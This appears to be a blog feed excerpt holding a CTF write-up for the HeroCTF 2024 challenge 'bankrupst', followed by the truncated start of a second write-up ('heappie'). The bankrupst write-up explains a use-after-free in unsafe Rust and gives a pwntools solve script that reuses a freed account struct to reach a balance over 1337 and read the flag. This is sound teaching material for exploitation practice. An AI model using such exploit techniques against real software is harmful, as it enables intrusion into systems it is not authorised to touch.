&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;bankrupst&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;ELF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;64-bit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;LSB&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;executable&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;x86-64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;SYSV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;static-pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;linked&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;BuildID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;sha1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;fcaba4040b2539cfd3c26241d864d3e46727ca82&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;stripped&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Reading the source code, we can see that every function has the &lt;em&gt;unsafe&lt;/em&gt; keyword. It is used to bypass Rust’s safety checks and allows greater &amp;ldquo;control&amp;rdquo; over memory, but it can also make your program vulnerable if memory is not managed properly.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h3 id="table-of-contents">Table of contents</h3>
<hr>
<ul>
<li>
<p><a href="/posts/2024/10/heroctf-2024-pwn/bankrupst/#file-information">File Information</a></p>
</li>
<li>
<p><a href="/posts/2024/10/heroctf-2024-pwn/bankrupst/#looking-for-a-vulnerability">Looking for a vulnerability</a></p>
</li>
<li>
<p><a href="/posts/2024/10/heroctf-2024-pwn/bankrupst/#exploit-plan-tldr">Exploit Plan (TLDR)</a></p>
</li>
<li>
<p><a href="/posts/2024/10/heroctf-2024-pwn/bankrupst/#solve-script">Solve Script</a></p>
</li>
<li>
<p><a href="/posts/2024/10/heroctf-2024-pwn/bankrupst/#conclusion">Conclusion</a></p>
</li>
</ul>
<hr>
<h2 id="note">Note</h2>
<p>Writeup for the first <code>pwn</code> challenge from HeroCTF 2024.</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>BankRupst is a bank operating in bankruptcy where no laws are applicable.
</span></span></code></pre></div><h2 id="file-information">File information</h2>
<p>We&rsquo;re given the binary and the source code which is written in Rust.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">bankrupst</span><span style="color:#f92672">;</span> <span style="color:#f92672">file</span> <span style="color:#f92672">bankrupst</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ctfs/heroctf2024/pwn/pwn_bankrupst/bankrupst&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>       <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Full</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>         <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>        <span style="color:#f92672">PIE</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stripped</span><span style="color:#f92672">:</span>   <span style="color:#f92672">No</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">bankrupst</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">pie</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">static-pie</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">fcaba4040b2539cfd3c26241d864d3e46727ca82</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>Reading the source code, we can see that every function has the <em>unsafe</em> keyword. It is used to bypass Rust’s safety checks and allows greater &ldquo;control&rdquo; over memory, but it can also make your program vulnerable if memory is not managed properly.</p>
<p>The program simulates a simple bank account manager: you can insert &amp; remove your card, deposit &amp; withdraw money, and check your balance.</p>
<h2 id="looking-for-a-vulnerability">Looking for a vulnerability</h2>
<p>We can see that option 4 is our <code>win</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#ae81ff">4</span> <span style="color:#f92672">=&gt;</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> opened {
</span></span><span style="display:flex;"><span>        println!(<span style="color:#e6db74">&#34;Account balance: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#f92672">*</span>account).balance);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>account).balance <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1337</span> {
</span></span><span style="display:flex;"><span>            println!(<span style="color:#e6db74">&#34;Congrats! You are now a special member!&#34;</span>);
</span></span><span style="display:flex;"><span>	        <span style="color:#66d9ef">let</span> flag_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag.txt&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">match</span> fs::read_to_string(flag_file) {
</span></span><span style="display:flex;"><span>                Ok(flag) <span style="color:#f92672">=&gt;</span> println!(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>, flag),
</span></span><span style="display:flex;"><span>                Err(e) <span style="color:#f92672">=&gt;</span> eprintln!(<span style="color:#e6db74">&#34;Error reading flag.txt: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>, e),
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        println!(<span style="color:#e6db74">&#34;Enter your BankRupst card!&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If our account’s balance is greater than <em>$1337</em>, the program will output the flag, so now we know our goal. We need to figure out how to achieve it.</p>
<p>Let&rsquo;s start by taking a look at the <code>deposit</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#66d9ef">unsafe</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">deposit</span>(account: <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> BankAccount) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>account).deposits <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">13</span> {
</span></span><span style="display:flex;"><span>            println!(<span style="color:#e6db74">&#34;Deposit limit reached this month.&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print!(<span style="color:#e6db74">&#34;How much do you want to deposit? &#34;</span>);
</span></span><span style="display:flex;"><span>        io::stdout().flush().unwrap();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> amount_input <span style="color:#f92672">=</span> String::new();
</span></span><span style="display:flex;"><span>        io::stdin().read_line(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> amount_input).unwrap();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> amount: <span style="color:#66d9ef">i32</span> <span style="color:#f92672">=</span> amount_input.trim().parse().unwrap();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> amount <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> amount <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span> {
</span></span><span style="display:flex;"><span>            println!(<span style="color:#e6db74">&#34;You cannot exceed 100 per deposit.&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            (<span style="color:#f92672">*</span>account).balance <span style="color:#f92672">+=</span> amount;
</span></span><span style="display:flex;"><span>            (<span style="color:#f92672">*</span>account).deposits <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>There are two important things:</p>
<ul>
<li>Only 13 deposits are allowed.</li>
<li>The maximum deposit amount is <em>$100</em>.</li>
</ul>
<p><em>Obviously,</em> we cannot deposit <em>$1338</em> to the account; the maximum is going to be <em>$1300</em>.</p>
<p>Let&rsquo;s try to find a way to work around this limit. We can notice a difference in how the <code>BankAccount</code> struct is dropped between options 5 and 6:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#ae81ff">5</span> <span style="color:#f92672">=&gt;</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> opened {
</span></span><span style="display:flex;"><span>                        (<span style="color:#f92672">*</span>account).balance<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                        (<span style="color:#f92672">*</span>account).deposits <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                        ptr::drop_in_place(account);
</span></span><span style="display:flex;"><span>                        opened <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>                        println!(<span style="color:#e6db74">&#34;BankRupst card removed.&#34;</span>);
</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                        println!(<span style="color:#e6db74">&#34;You must insert your BankRupst card!&#34;</span>);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">6</span> <span style="color:#f92672">=&gt;</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> opened {
</span></span><span style="display:flex;"><span>                        (<span style="color:#f92672">*</span>account).balance<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                        (<span style="color:#f92672">*</span>account).deposits <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">let</span> layout <span style="color:#f92672">=</span> Layout::new::<span style="color:#f92672">&lt;</span>BankAccount<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>                        dealloc(account <span style="color:#66d9ef">as</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> <span style="color:#66d9ef">u8</span>, layout);
</span></span><span style="display:flex;"><span>                        account <span style="color:#f92672">=</span> ptr::null_mut();
</span></span><span style="display:flex;"><span>                        opened <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>                        println!(<span style="color:#e6db74">&#34;Thank you for using BankRupst!&#34;</span>);
</span></span></code></pre></div><p>In option 6, the memory chunk is deallocated, and the pointer is nulled.
In option 5, this is not the case. The <code>drop_in_place</code> function only destroys the struct, but the memory chunk is not deallocated.</p>
<p>This means that if we remove our card and insert it again, our new <code>BankAccount</code> struct will occupy the previous account&rsquo;s memory chunk.</p>
<p>Let&rsquo;s take a look at how a <code>BankAccount</code> is created:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">BankAccount</span> {
</span></span><span style="display:flex;"><span>    balance: <span style="color:#66d9ef">i32</span>,
</span></span><span style="display:flex;"><span>    deposits: <span style="color:#66d9ef">u32</span>,
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">impl</span> BankAccount {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsafe</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">new</span>() -&gt; <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> BankAccount {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> layout <span style="color:#f92672">=</span> Layout::new::<span style="color:#f92672">&lt;</span>BankAccount<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> ptr <span style="color:#f92672">=</span> alloc(layout) <span style="color:#66d9ef">as</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">mut</span> BankAccount;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ptr.is_null() {
</span></span><span style="display:flex;"><span>            panic!(<span style="color:#e6db74">&#34;Memory allocation failed!&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        (<span style="color:#f92672">*</span>ptr).deposits <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        ptr 
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>As you can see, <code>deposits</code> is set to <code>0</code>.</p>
<h2 id="exploit-plan-tldr">Exploit Plan (TLDR)</h2>
<ol>
<li>Insert the card (make an account).</li>
<li>Make 13 deposits of <em>$100</em> each.</li>
<li>Remove the card (drop the struct).</li>
<li>Insert the card again (reuse the memory chunk).</li>
<li>Check the balance.</li>
</ol>
<p>⚠️ This solution works thanks to weird memory behaviour; check <a href="https://github.com/HeroCTF/HeroCTF_v6/tree/main/Pwn/BankRupst">the author&rsquo;s writeup</a> for the intended solution.</p>
<h2 id="solve-script">Solve Script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>update(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x86_64&#39;</span>)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bankrupst&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;pwn.heroctf.fr&#34;</span>, <span style="color:#ae81ff">6001</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./bankrupst&#34;</span>)
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># =-=-=- Un jour je serai le meilleur pwner -=-=-=</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Insert card</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;option: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fill the account to get the amount to 1300</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">13</span>):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;option: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;deposit? &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;100&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove the card to drop the struct</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;option: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reinsert the card to make a new struct over it</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;option: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Flag !</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;option: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print((<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Flag -&gt; Hero&#34;</span> <span style="color:#f92672">+</span> io<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Hero&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Nice challenge exploiting a <em>logic bug</em> and a <em>use-after-free</em>.</p>
<p><a href="/posts/2024/10/heroctf-2024-pwn/bankrupst/#top">back to top</a></p>
]]></content>
        </item>
        
        <item>
            <title>🇬🇧 HeroCTF 2024 - pwn/heappie</title>
            <link>/posts/2024/10/heroctf-2024-pwn/heappie/</link>
            <pubDate>Sun, 27 Oct 2024 00:00:00 +0000</pubDate>
            
            <guid>/posts/2024/10/heroctf-2024-pwn/heappie/</guid>
            <description>&lt;h3 id=&#34;table-of-contents&#34;&gt;Table of contents&lt;/h3&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/heappie/#file-information&#34;&gt;File Information&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/heappie/#looking-for-a-vulnerability&#34;&gt;Looking for a vulnerability&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/heappie/#exploit-plan-tldr&#34;&gt;Exploit Plan (TLDR)&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/heappie/#solve-script&#34;&gt;Solve Script&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/heappie/#conclusion&#34;&gt;Conclusion&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;Writeup for the second &lt;code&gt;pwn&lt;/code&gt; challenge from HeroCTF 2024.&lt;/p&gt;
&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Heappie is a simple application that allows you to save and play your favorite songs. Find a way to exploit it and read the flag.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;file-information&#34;&gt;File information&lt;/h2&gt;
&lt;p&gt;We are given the binary and the source code, which is written in C.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;checksec&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;heappie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;heappie&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/conflict/ctfs/heroctf2024/pwn/heappie/heappie&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Arch&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;amd64-64-little&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Full&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Canary&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;found&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;         &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;SHSTK&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Enabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;IBT&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;Enabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stripped&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Debuginfo&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;Yes&lt;/span&gt;
